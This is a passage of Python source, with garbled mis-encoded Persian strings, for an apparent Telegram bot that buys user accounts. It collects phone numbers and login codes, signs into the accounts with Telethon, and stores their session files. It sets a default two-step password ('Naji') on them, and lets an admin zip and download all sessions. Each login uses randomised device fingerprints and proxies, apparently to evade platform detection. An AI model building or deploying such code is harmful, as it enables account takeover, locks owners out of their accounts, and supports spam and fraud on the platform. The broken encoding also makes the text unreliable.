                    await event.reply(f"âœ… Ø¢Ù…Ø§Ø± Ú©Ø§Ø±Ø¨Ø± Ø¨Ø§ Ù…Ø´Ø®ØµØ§Øª : {usr} Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø±ÛŒØ³Øª Ø´Ø¯â•")

                else:
                    await event.reply("âŒÚ©Ø§Ø±Ø¨Ø±ÛŒ Ø¨Ø§ Ø§ÛŒÙ† Ù…Ø´Ø®ØµØ§Øª ÛŒØ§ÙØª Ù†Ø´Ø¯")

            else:
                mlist = user.keys(f"sacc:*")

                for item in mlist:
                    user.set(item, 0)

                user.set("accs", 0)
                await event.reply("âœ… Ú©Ù„ÛŒÙ‡ Ø§Ù…Ø§Ø± Ø±Ø¨Ø§Øª Ø±ÛŒØ³Øª Ø´Ø¯ ")

        if text.startswith("help") or text.startswith("/help"):
            await event.reply('''
    ğŸ‘½ help 

    â–«ï¸Ù†Ù…Ø§ÛŒØ´ Ø±Ø§Ù‡Ù†Ù…Ø§ Ùˆ Ù…Ø³ØªÙ†Ø¯Ø§Øª Ø±Ø¨Ø§Øª 

    â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­

    ğŸ‘½ ping 

    â–ªï¸Ù†Ù…Ø§ÛŒØ´ ÙˆØ¶Ø¹ÛŒØª Ø±Ø¨Ø§Øª 

    â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­

    ğŸ‘½ /send [ID] [TEXT]

    â–«ï¸Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… Ø¨Ù‡ Ú©Ø§Ø±Ø¨Ø± Ø®Ø§Øµ ( Ø¨Ø§ Ú†Øª Ø§ÛŒØ¯ÛŒ )

    â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­

    ğŸ‘½   /forward 

    â–ªï¸ÙÙˆØ± ÙˆØ§Ø±Ø¯ Ù‡Ù…Ú¯Ø§Ù†ÛŒ 

    â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­

    ğŸ‘½  /setpass  [PASSWORD]

    â–ªï¸ ØªÙ†Ø¸ÛŒÙ… Ù¾Ø³ÙˆØ±Ø¯ Ø®Ø§Øµ Ø±ÙˆÛŒ Ø§Ú©Ø§Ù†Øª Ù‡Ø§.
    âš ï¸Ø¯Ø± Ø­Ø§Ù„Øª Ù¾ÛŒØ´ÙØ±Ø¶ Ù¾Ø³ÙˆØ±Ø¯ ØªÙ…Ø§Ù…ÛŒ Ø§Ú©Ø§Ù†Øª Ù‡Ø§ Naji Ø§Ø³Øª.

    â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­

    ğŸ‘½ on | off   

    â–«ï¸ Ø±ÙˆØ´Ù† Ø®Ø§Ù…ÙˆØ´ Ú©Ø±Ø¯Ù† Ø±Ø¨Ø§Øª 

    â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­

    ğŸ‘½ /amar [ID] 

    â–ªï¸ Ú¯Ø±ÙØªÙ† Ø¢Ù…Ø§Ø± Ø§Ú©Ø§Ù†Øª Ù‡Ø§ÛŒ Ø§Ù‡Ø¯Ø§ Ø´Ø¯Ù‡ Ø§Ø² Ú©Ø§Ø±Ø¨Ø± Ø®Ø§Øµ

    â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­

    ğŸ‘½ /getamar 

    â–«ï¸Ú¯Ø±ÙØªÙ† Ø¢Ù…Ø§Ø± Ú©Ù„ 
â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­

/getsessions0
Ú¯Ø±ÙØªÙ† Ú©Ù„ ÙØ§ÛŒÙ„ Ù‡Ø§ 

/getsessions1

Ú¯Ø±ÙØªÙ† Ù¾ÙˆØ´Ù‡ Ø³Ø§Ù„Ù… Ù‡Ø§

/getsessions2

Ú¯Ø±ÙØªÙ† Ù¾ÙˆØ´Ù‡ Ø±ÛŒÙ¾ÙˆØ±Øª Ù‡Ø§

â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­

/reset id

Ø±ÛŒØ³Øª Ú©Ø±Ø¯Ù† Ú©Ø§Ø±Ø¨Ø±Ø®Ø§Øµ

/reset

Ø±ÛŒØ³Øª Ú©Ù„ Ø§Ù…Ø§Ø±

â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­

resiver @ImTanun

                ''')

        if text.startswith("/getsessions0"):

            try:
                shutil.make_archive("Accountsres", 'zip', "Accountsres")
                await bot.send_file(event.chat_id, 'Accountsres.zip')

                await bot.send_message(event.chat_id, "âœ… Ø³Ø´Ù† Ù‡Ø§ÛŒ Ø±Ø¨Ø§Øª Ø§Ø±Ø³Ø§Ù„ Ú¯Ø±Ø¯ÛŒØ¯")

                os.remove("Accountsres.zip")

            except Exception as e:
                await event.reply(str(e))

        if text.startswith("/setpass"):
            try:

                passCode = event.raw_text.split("/setpass")[1]
                passCode = passCode.strip()
                user.set("pass", passCode)
                await event.reply("âœ…ØªÙ†Ø¸ÛŒÙ… Ø¯Ùˆ Ù…Ø±Ø­Ù„Ù‡ Ø§ÛŒ Ø¨Ø± Ø±ÙˆÛŒ Ø§Ú©Ø§Ù†Øª Ø´Ù…Ø§ ØªÙ†Ø¸ÛŒÙ… Ø´Ø¯ ")

            except:
                await event.reply("â€¼ï¸ Ù„Ø·ÙØ§ Ø¯Ø³ØªÙˆØ± ÙˆØ§Ø±Ø¯ Ø´Ø¯Ù‡ Ø±Ø§ Ø¨Ù‡ Ø¯Ù‚Øª Ùˆ Ø¨Ù‡ Ø¯Ø±Ø³ØªÛŒ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ ")

        elif event.raw_text.lower() == 'accounts':

            ev = []
            tl = 0
            for item in os.scandir('Accountsres'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [
                        [Button.inline(item.name, 'settings|{}'.format(item.name))]]
                    ev.extend(l)
                    tl += 1

            ev.extend([[Button.inline("â–«ï¸Ø§Ù†ØªÙ‚Ø§Ù„ Ø§Ú©Ø§Ù†Øª", "enteghal")]])
            print("ok")
            if tl >= 1:
                try:
                    await event.reply('Ø´Ù…Ø§  **{}**  Ø§Ú©Ø§Ù†Øª Ø¯Ø§Ø±ÛŒØ¯  '.format(tl), buttons=ev)

                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev, 50):
                        await event.reply('Ø´Ù…Ø§  **{}**  Ø§Ú©Ø§Ù†Øª Ø¯Ø§Ø±ÛŒØ¯  '.format(tl), buttons=ev)

            else:
                await event.reply('Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø®Ø§Ù„ÛŒ Ø§Ø³Øª !')

        if text.startswith("on"):
            user.set("on", 1)
            await event.reply("âœ… Ø±Ø¨Ø§Øª Ø¯Ø± Ø­Ø§Ù„ Ø­Ø§Ø¸Ø± Ø±ÙˆØ´Ù† Ø§Ø³Øª ")

        elif text.startswith("off"):
            user.set("on", 0)
            await event.reply('''ğŸ”Œ Ø±Ø¨Ø§Øª Ø®Ø§Ù…ÙˆØ´ Ø´Ø¯ 
    â–â–â–â–â–â– 
    Ø¨Ø±Ø§ÛŒ Ø±ÙˆØ´Ù† Ú©Ø±Ø¯Ù† Ø§Ù† Ø§Ø² Ø¯Ø³ØªÙˆØ± Â»

    on 

    Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯''')

        elif text.startswith("/forward"):

            await event.reply('''âš ï¸ Ø¨Ù†Ø± Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ø±Ø§ÛŒ ÙÙˆØ± ÙˆØ§Ø±Ø¯ Ù‡Ù…Ú¯Ø§Ù†ÛŒ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯ â•''')
            user.set(f"step:{userids}", "fwd")

        elif user.get(f"step:{userids}") == "fwd":

            await event.reply('''âœ…âœ… Ø¨Ù†Ø± Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª ØªÙ†Ø¸ÛŒÙ… Ø´Ø¯ 
    â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­â–¬â–­
    Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ú©Ø§Ø±Ø¨Ø±Ø§Ù† Ù„Ø·ÙØ§ Ù…Ù†ØªØ¸Ø± Ø¨Ù…Ø§Ù†ÛŒØ¯ !''')

            scount = 0
            fcount = 0
            for item in account.smembers("user"):

                try:
                    await bot.forward_messages(int(item), event.message)
                    await asyncio.sleep(0.2)
                    scount += 1

                except Exception as e:
                    print(str(e))
                    fcount += 1

            await event.reply(f'''âœ… Ø¹Ù…Ù„ÛŒØ§Øª ÙÙˆØ± ÙˆØ§Ø±Ø¯ Ù‡Ù…Ú¯Ø§Ù†ÛŒ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ Ø§ØªÙ…Ø§Ù… Ø±Ø³ÛŒØ¯ 
    â–â–â–â–â–â–
    ğŸ‘½ Ù…ÙˆÙÙ‚ÛŒØª Ø¢Ù…ÛŒØ± : {scount}

    ğŸ¥µ ØºÛŒØ± Ù…ÙˆÙÙ‚ÛŒØª Ø¢Ù…ÛŒØ² : {fcount}
    â–â–â–â–â–â–''')
            user.set(f"step:{userids}", "None")

        elif text.startswith("/send"):
            try:
                datas = event.raw_text.split("/send")[1]
                datas = datas.strip()
                datas = datas.split(None, 1)
                id = int(datas[0].strip())
                txt = datas[1]
                try:
                    await bot.send_message(id, txt)
                    await event.reply("âœ… Ù¾ÛŒØ§Ù… Ø´Ù…Ø§ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯ ")
                except Exception as e:
                    await event.reply("Error : " + str(e))
            except Exception as e:
                print(str(e))
                await event.reply('''âš ï¸ ÙØ±Ù…Øª ØµØ­ÛŒØ­ Ø¯Ø³ØªÙˆØ± Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ :

    â–â–â–â–â–â– 

    /send id text

    â–â–â–â–â–â–
    Ù…Ø«Ø§Ù„ : 
    /send 28219976 Ø³Ù„Ø§Ù… Ùˆ Ø®Ø³ØªÙ‡ Ù†Ø¨Ø§Ø´ÛŒØ¯''')

        elif text.startswith("/amar"):

            if ((event.raw_text.split("/amar"))[1].strip()).isdigit():
                usr = (event.raw_text.split("/amar")[1]).strip()
                print(usr)
                sacc = user.get(f"sacc:{usr}")

                txt = f'''âœ… ØªØ¹Ø¯Ø§Ø¯ Ø§Ú©Ø§Ù†Øª Ø§Ù‡Ø¯Ø§ Ø´Ø¯Ù‡ : {sacc}

    â–â–â–â–â–â– 

'''

                await event.reply(txt)

            else:

                acc = user.get(f"accs")
                if acc == None:
                    acc = 0

                txt = f'''âœ… ØªØ¹Ø¯Ø§Ø¯ Ú©Ù„ Ø§Ú©Ø§Ù†Øª Ù‡Ø§ Ø§Ù‡Ø¯Ø§ Ø´Ø¯Ù‡ : {acc}

    â–â–â–â–â–â– 
'''

                await event.reply(txt)

        # -------------------------

    if user.get("on") == "1":

        if event.raw_text.lower() == "Ø±Ø³ÛŒÙˆØ±":

            if validate(userids):

                await event.reply('''ğŸ˜€Ø¨Ù‡ Ø±Ø¨Ø§Øª Ø®Ø±ÛŒØ¯Ø´Ù…Ø§Ø±Ù‡ Ø§Ø±ÙˆÙ¾Ø§ Ø®ÙˆØ´ Ø§Ù…Ø¯ÛŒØ¯ğŸŒ¹

ğŸ’°Ù‚ÛŒÙ…Øª Ù‡Ø±Ø§Ú©Ø§Ù†Øª4000ØªÙˆÙ…Ù† Ù…ÛŒØ¨Ø§Ø´Ø¯

â–ªï¸Ù„Ø·ÙØ§ Ùˆ Ø­ØªÙ…Ø§ Ù‚Ø¨Ù„ Ø§Ø²Ø´Ø±ÙˆØ¹ Ú©Ø§Ø± Ø¨Ø§ Ø§Ø¯Ù…ÛŒÙ† Ù‡Ù…Ø§Ù‡Ù†Ú¯ Ú©Ù†ÛŒØ¯ğŸ‘‡
 @ImTanun

ğŸ“Ø±ÙˆÛŒ Ø¯Ú©Ù…Ù‡ Ø§Ø±Ø³Ø§Ù„ Ø´Ù…Ø§Ø±Ù‡ Ú©Ù„ÛŒÚ© Ú©Ù†ÛŒØ¯ğŸ‘‡''', buttons=[[Button.text("Ø§Ø±Ø³Ø§Ù„ Ø´Ù…Ø§Ø±Ù‡ ğŸ“", resize=True)], [Button.text("â•Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ", resize=True), Button.text("â”Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…Ù†", resize=True)], [Button.text("âœ…ØªØ³ÙˆÛŒÙ‡ Ø­Ø³Ø§Ø¨", resize=True)], [Button.text("ğŸŒˆØ¯Ø±ÛŒØ§ÙØª Ú©Ø¯", resize=True)]])

                user.set(f"step:{userids}", "None")

            else:
                user.set(f"step:{userids}", 'None')
                account.sadd("user", userids)
                if user.get(f"sacc:{userids}") == None:
                    user.set(f"sacc:{userids}", 0)
                if user.get(f"facc:{userids}") == None:
                    user.set(f"facc:{userids}", 0)
                if user.get(f"nacc:{userids}") == None:
                    user.set(f"nacc:{userids}", 0)
                await event.reply('''ğŸ˜€Ø¨Ù‡ Ø±Ø¨Ø§Øª Ø®Ø±ÛŒØ¯Ø´Ù…Ø§Ø±Ù‡ Ø§Ù…Ø±ÛŒÚ©Ø§Ø®ÙˆØ´ Ø§Ù…Ø¯ÛŒØ¯ğŸŒ¹

ğŸ’°Ù‚ÛŒÙ…Øª Ù‡Ø±Ø§Ú©Ø§Ù†Øª4000ØªÙˆÙ…Ù† Ù…ÛŒØ¨Ø§Ø´Ø¯

â–ªï¸Ù„Ø·ÙØ§ Ùˆ Ø­ØªÙ…Ø§ Ù‚Ø¨Ù„ Ø§Ø²Ø´Ø±ÙˆØ¹ Ú©Ø§Ø± Ø¨Ø§ Ø§Ø¯Ù…ÛŒÙ† Ù‡Ù…Ø§Ù‡Ù†Ú¯ Ú©Ù†ÛŒØ¯ğŸ‘‡
 @ImTanun

ğŸ“Ø±ÙˆÛŒ Ø¯Ú©Ù…Ù‡ Ø§Ø±Ø³Ø§Ù„ Ø´Ù…Ø§Ø±Ù‡ Ú©Ù„ÛŒÚ© Ú©Ù†ÛŒØ¯ğŸ‘‡''', buttons=[[Button.text("Ø§Ø±Ø³Ø§Ù„ Ø´Ù…Ø§Ø±Ù‡ ğŸ“", resize=True)], [Button.text("â•Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ", resize=True), Button.text("â”Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…Ù†", resize=True)], [Button.text("âœ…ØªØ³ÙˆÛŒÙ‡ Ø­Ø³Ø§Ø¨", resize=True)]])

        elif event.raw_text == "â•Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ":
            await event.reply('''ğŸ‘½ Ù…ØªÙ† Ø®ÙˆØ¯ Ø±Ø§ Ø®Ù„Ø§ØµÙ‡ Ø¨Ù†ÙˆÛŒØ³ÛŒØ¯ØŒ Ù¾Ø³ Ø§Ø² Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… ÛŒÚ©ÛŒ Ø§Ø¯ Ø§Ø¯Ù…ÛŒÙ† Ù‡Ø§ÛŒ Ù…Ø§ Ø¨Ø§ Ø´Ù…Ø§ ØªÙ…Ø§Ø³ Ø®ÙˆØ§Ù‡Ø¯ Ú¯Ø±ÙØª''', buttons=[[Button.inline("cancel", "cancel")]])

            user.set(f"step:{userids}", "contact")

        elif event.raw_text == "âœ…ØªØ³ÙˆÛŒÙ‡ Ø­Ø³Ø§Ø¨":

            if user.get(f"allow:{userids}") == "true" or user.get(f"allow:{userids}") == None:

                if int(user.get(f"sacc:{userids}")) < 10:
                    await event.reply("âŒØ®Ø·Ø§ ! Ø¨Ø±Ø§ÛŒ Ø¯Ø±Ø®Ø§Ø³Øª ØªØµÙˆÛŒÙ‡ Ø­Ø¯Ø§Ù‚Ù„ 10 Ø§Ú©Ø§Ù†Øª Ø§Ù‡Ø¯Ø§ Ú©Ù†ÛŒØ¯ âŒ")
                    return

                await event.reply('''
    âœ… Ú©Ø§Ø±Ø¨Ø± Ø¹Ø²ÛŒØ² Ù„Ø·ÙØ§ Ø´Ù…Ø§Ø±Ù‡ Ú©Ø§Ø±Øª Ùˆ ÛŒØ§ Ø´Ù…Ø§Ø±Ù‡ Ø´Ø¨Ø§ Ø®ÙˆØ¯ Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ â•
    â–â–â–â–â–â–â–â–â–
                    ''')

                user.set(f"step:{userids}", "cartnum")

            else:

                await event.reply('''
âŒ Ø´Ù…Ø§ Ù‚Ø¨Ù„Ø§ ÛŒÚ© Ø³ÙØ§Ø±Ø´ Ø«Ø¨Øª Ø´Ø¯Ù‡ Ø¯Ø§Ø±Ø¯ 
â–â–â–â–â–â–â–
Ù„Ø·ÙØ§ ØªØ§ Ù¾Ø§ÛŒØ§Ù† Ù…Ø´Ø®Øµ Ø´Ø¯Ù† ÙˆØ¶Ø¹ÛŒØª Ø³ÙØ§Ø±Ø´ Ù…Ù†ØªØ¸Ø± Ø¨Ù…Ø§ÛŒÙ†Ø¯ 
â–â–â–â–â–â–â–
Ø¯Ø±ÙˆØµØ±Øª ØªÙ…Ø§ÛŒÙ„ Ø¨Ù‡ Ø¨Ø§Ø²Ú¯Ø´Øª Ø¨Ù‡ Ù…Ù†ÙˆÛŒ Ø§ØµÙ„ÛŒ Ø§Ø² Ú©Ù„ÛŒØ¯  \n
Ø±Ø³ÛŒÙˆØ± 
Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯ .
                    ''')

        elif event.raw_text.isdigit() and user.get(f"step:{userids}") == "cartnum":
            await event.reply('''
âœ… Ø³ÙØ§Ø±Ø´ Ø´Ù…Ø§ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª ØµØ¨Øª Ø´Ø¯ 
â–â–â–â–â–â–â–
Ù„Ø·ÙØ§ ØªØ§ Ù¾Ø§ÛŒØ§Ù† Ù…Ø´Ø®Øµ Ø´Ø¯Ù† ÙˆØ¶Ø¹ÛŒØª Ø³ÙØ§Ø±Ø´ Ù…Ù†ØªØ¸Ø± Ø¨Ù…Ø§ÛŒÙ†Ø¯ 
â–â–â–â–â–â–â–
Ø¯Ø±ÙˆØµØ±Øª ØªÙ…Ø§ÛŒÙ„ Ø¨Ù‡ Ø¨Ø§Ø²Ú¯Ø´Øª Ø¨Ù‡ Ù…Ù†ÙˆÛŒ Ø§ØµÙ„ÛŒ Ø§Ø² Ú©Ù„ÛŒØ¯  \n
Ø±Ø³ÛŒÙˆØ± 
Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯ .
                ''')

            user.set(f"allow:{userids}", "false")

            pol = user.get(f"sacc:{userids}")
            cart = event.raw_text

            txt = f'''
âœ…Ú©Ø§Ø±Ø¨Ø± Ø¨Ø§ Ù…Ø´Ø®ØµØ§Øª :

â•ID : {userids}
â–â–â–â–
â€¼ï¸ ØªØ¹Ø¯Ø§Ø¯ Ø´Ù…Ø§Ø±Ù‡ Ù‡Ø§ÛŒ Ø§Ù‡Ø¯Ø§ Ø´Ø¯Ù‡ : {pol}
â–â–â–â–
âœ…Ø´Ù…Ø§Ø±Ù‡ Ú©Ø§Ø±Øª  : {cart}
â–â–â–â–
Ù„Ø·ÙØ§ Ø¯Ø± ØµÙˆØ±Øª ÙˆØ§Ø±ÛŒØ² Ø´Ø¯Ù† Ø¨Ù‡ Ø­Ø³Ø§Ø¨ Ø¯Ú©Ù…Ù‡ "âœ…" Ùˆ Ø¯Ø± ØµÙˆØ±Øª Ø¹Ø¯Ù… ÙˆØ§Ø±ÛŒØ²ÛŒ Ùˆ ÛŒØ§ Ù…Ø´Ú©Ù„ Ú©Ù„ÛŒØ¯ "âŒ" Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯

            '''
            await bot.send_message(adminssss, txt, buttons=[[Button.inline("âœ…", f"+:{userids}"), Button.inline("âŒ", f"-:{userids}")]])

        elif event.raw_text == "ØªØ³ÙˆÛŒÙ‡ Ø­Ø³Ø§Ø¨ ğŸ’°":
            await event.reply("âš ï¸ Ø¨Ø²ÙˆØ¯ÛŒ Ø§ÛŒÙ† Ø¨Ø®Ø´ Ø§Ø¶Ø§ÙÙ‡ Ù…ÛŒÚ¯Ø±Ø¯Ø¯.")

        elif event.raw_text == "â”Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…Ù†":
            usr = event.sender_id
            sacc = user.get(f"sacc:{usr}")
            if sacc == None:
                sacc = 0
            txt = f'''
â€¼ï¸ Ú©Ø§Ø±Ø¨Ø± Ø¹Ø²ÛŒØ² ØªØ¹Ø¯Ø§Ø¯ Ø§Ú©Ø§Ù†Øª Ù‡Ø§ÛŒ Ø§Ù‡Ø¯Ø§ Ø´Ø¯Ù‡ Ø§Ø² Ø¬Ø§Ù†Ø¨ Ø´Ù…Ø§ : {sacc} Ø¹Ø¯Ø¯ Ù…ÛŒØ¨Ø§Ø´Ø¯ .
            '''
            await event.reply(txt)

        elif event.raw_text == "Ø§Ø±Ø³Ø§Ù„ Ø´Ù…Ø§Ø±Ù‡ ğŸ“":
            await event.reply("âœ…Ø´Ù…Ø§Ø±Ù‡ Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ø§ Ù¾ÛŒØ´ Ø´Ù…Ø§Ø±Ù‡ ( + ) Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯ : \n âœ…Ù‚ÛŒÙ…Øª Ù‡Ø± Ø§Ú©Ø§Ù†Øª 4000")
            user.set(f"step:{userids}", "getPhone")

        elif event.raw_text == "ping" or event.raw_text == "Ping":
            await event.reply("âœ… Online")

        elif event.raw_text and user.get(f"step:{userids}") == "contact":
            txt = event.raw_text
            txt += f"\n â–â–â–â–â–â– \n â“ID : {userids} "
            try:

                await bot.send_message(adminssss, txt)
                await event.reply('''ğŸ‘½ Ú©Ø§Ø±Ø¨Ø± Ø¹Ø²ÛŒØ² Ù¾ÛŒØ§Ù… Ø´Ù…Ø§ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ù‡ ÛŒÚ©ÛŒ Ø§Ø² Ø§Ø¯Ù…ÛŒÙ† Ù‡Ø§ÛŒ Ø±Ø¨Ø§Øª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯ Ùˆ Ø¯Ø± Ø§Ø³Ø±Ø¹ ÙˆÙ‚Øª Ù¾Ø§Ø³Ø® Ø´Ù…Ø§ Ø¯ÙˆØ³Øª Ø¹Ø²ÛŒØ² Ø¯Ø§Ø¯Ù‡ Ø®ÙˆØ§Ù‡Ø¯ Ø´Ø¯.

âš ï¸ Ù¾ÛŒØ´Ø§Ù¾ÛŒØ´ Ø§Ø² ØµØ¨Ø± Ø´Ù…Ø§ Ù…ØªØ´Ú©Ø±ÛŒÙ…â¤ï¸''')

            except Exception as e:
                print(str(e))
                await event.reply("we have Some Problem ! Try Again Later !")
            user.set(f"step:{userids}", "None")

        elif event.raw_text.startswith("+") and user.get(f"step:{userids}") == "getPhone":
            print("getPhone")
            phones = event.raw_text
            phones = (phones.split("+")[1].replace(" ", ""))

            if not phones.isdigit():
                await event.reply("âŒ Ø´Ù…Ø§Ø±Ù‡ ÙˆØ§Ø±Ø¯ Ø´Ø¯Ù‡ Ø§Ø´ØªØ¨Ø§Ù‡ Ø§Ø³Øª")

                return

            phones = "+" + phones
            print(phones)
            # m = await event.reply("â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ...")
            if os.path.exists('Accountsres/{0}/'.format(phones)):
                await event.reply('**âŒ Ø§ÛŒÙ† Ø§Ú©Ø§Ù†Øª Ù‚Ø¨Ù„Ø§ Ø¯Ø± Ø¯ÛŒØªØ§Ø¨ÛŒØ³ Ø±Ø¨Ø§Øª Ø«Ø¨Øª Ø´Ø¯Ù‡â—ï¸**')
            else:

                try:

                    w = getapiPhone(phones)
                    print(w)
                    device = random.choice(devices)
                    version1 = random.choice(version)
                    appv = random.choice(appvs)
                    pr = await random_proxy()
                    print(pr)
                    new = TelegramClient('Accountsres/{0}'.format(phones), w[0], w[1],
                                        device_model=device,
                                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                        proxy=tuple(pr),
                                        system_version=version1,
                                        app_version=appv)

                    await new.connect()
                    # if not await new.is_user_authorized():
                    try:
                        result = await new.send_code_request(phones)
                        user.set(f'code_mode:{userids}',  '{0}:{1}:{2}:{3}'.format(
                            phones, result.phone_code_hash, w[0], w[1]))
                        await new.disconnect()
                        await event.reply(f'''â–«ï¸ Ú©Ø§Ø±Ø¨Ø± Ø¹Ø²ÛŒØ²ØŒ Ú©Ø¯ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯Ù‡ Ø¨Ù‡ Ø´Ù…Ø§Ø±Ù‡  {phones} Ø±Ø§ Ø¨Ø§ Ø¯Ù‚Øª ÙˆØ§Ø±Ø¯ Ú©Ø±Ø¯Ù‡  \n â–â–â–â–â–â–\n''')

                        user.set(f"step:{userids}", "getCode")

                    except Exception as e:
                        print(str(e))
                        await event.reply('**âŒ Error In Send Code Please Try Again Later...**')
                        try:
                            await new.disconnect()
                            os.remove('Accountsres/{}.session'.format(phones))
                        except:
                            pass
                except KeyError:
                    await event.reply('**ğŸ”° No Any Account In Queue \n use Ø±Ø³ÛŒÙˆØ± **')
                    user.set(f"step:{userids}", 'None')

        elif event.raw_text == "Ø¨Ø§Ø²Ú¯Ø´Øª Ø¨Ù‡ Ù…Ù†ÙˆÛŒ Ø§ØµÙ„ÛŒ":
            user.delete(f"step:{userids}")
            await event.reply('''
â–«ï¸Ø¨Ù‡ Ù…Ù†ÙˆÛŒ Ø§ØµÙ„ÛŒ Ø¨Ø§Ø²Ú¯Ø´ØªÛŒØ¯.

âœ… Ù„Ø·ÙØ§ Ú¯Ø²ÛŒÙ†Ù‡ Ù…Ù†Ø§Ø³Ø¨ Ø±Ùˆ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯ 
                ''', buttons=[[Button.text("Ø§Ø±Ø³Ø§Ù„ Ø´Ù…Ø§Ø±Ù‡ ğŸ“", resize=True)], [Button.text("â•Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ", resize=True), Button.text("â”Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…Ù†", resize=True)]])

        elif event.raw_text.isdigit() and user.get(f"step:{userids}") == "getCode":
            try:
                key = user.get(f'code_mode:{userids}')
                w = getapiPhone(key.split(':')[0])
                await event.reply('**ğŸ”° â–ªï¸ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ .... **')
                device = random.choice(devices)
                version1 = random.choice(version)
                appv = random.choice(appvs)
                pr = await random_proxy()
                print(pr)
                new = TelegramClient('Accountsres/{0}'.format(key.split(':')[0]), w[0], w[1],
                                    device_model=device,
                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                    proxy=tuple(pr),
                                    system_version=version1,
                                    app_version=appv)

                await new.connect()

                await new(functions.auth.SignInRequest(phone_number=key.split(':')[0], phone_code_hash=key.split(':')[1], phone_code=event.raw_text))
                info = await new.get_me()

                await event.reply('''** \nÚ©Ø§Ø±Ø¨Ø± Ø¹Ø²ÛŒØ² Ù„Ø·ÙØ§ Ù¾Ø³ Ø§Ø² 5 Ø¯Ù‚ÛŒÙ‚Ù‡ Ø¯Ú©Ù…Ù‡ Ø²ÛŒØ± Ø±Ø§ Ø¨Ø²Ù†ÛŒØ¯ Ùˆ Ø§Ú©Ø§Ù†Øª Ø®ÙˆØ¯ Ø±Ø§ Ø§Ù‡Ø¯Ø§ Ú©Ù†ÛŒØ¯ **\n â–â–â–â–â–â– \n Ù…Ø´Ø®ØµØ§Øª Ø§Ú©Ø§Ù†Øª \n ğŸ‘½  Username : {1}\n \n â–â–â–â–â–â– \n ğŸ‘½  Phone : +{2}\n  \n â–â–â–â–â–â– \n ğŸ‘½ FirstName : {3}\n \n â–â–â–â–â–â– \n ğŸ‘½ LastName : {4}** \n â–â–â–â–â–â– \n'''.format(key.split(':')[2]+':'+key.split(':')[3], str(info.username), str(info.phone), info.first_name, info.last_name), buttons=[[Button.inline("âœ… check ", f"True|{time.time()}|+{info.phone}|{event.raw_text}")]])

                user.set(f"step:{userids}", 'None')

                await new.disconnect()

            except errors.rpcerrorlist.PhoneCodeExpiredError:
                await event.reply('**âš ï¸ phone code Exipired \n â–¬â–­â–¬â–­â–¬â–­â–¬ \n  Please  Enter Phone number Again \n  **')
                await new.disconnect()

                user.set(f"step:{userids}", 'None')

            except errors.SessionPasswordNeededError:
                await event.reply('**âš ï¸ âš ï¸Ù„Ø·ÙØ§ Ù¾Ø³ÙˆØ±Ø¯ Ø¯Ùˆ Ù…Ø±Ø­Ù„Ù‡ Ø§ÛŒ Ø±Ùˆ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ Ùˆ ÛŒØ§ Ø§Ø² Ú¯Ø²ÛŒÙ†Ù‡ Ø²ÛŒØ± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯  **')
                await new.disconnect()
                user.set(f"step:{userids}", "2fa")

            except KeyError:
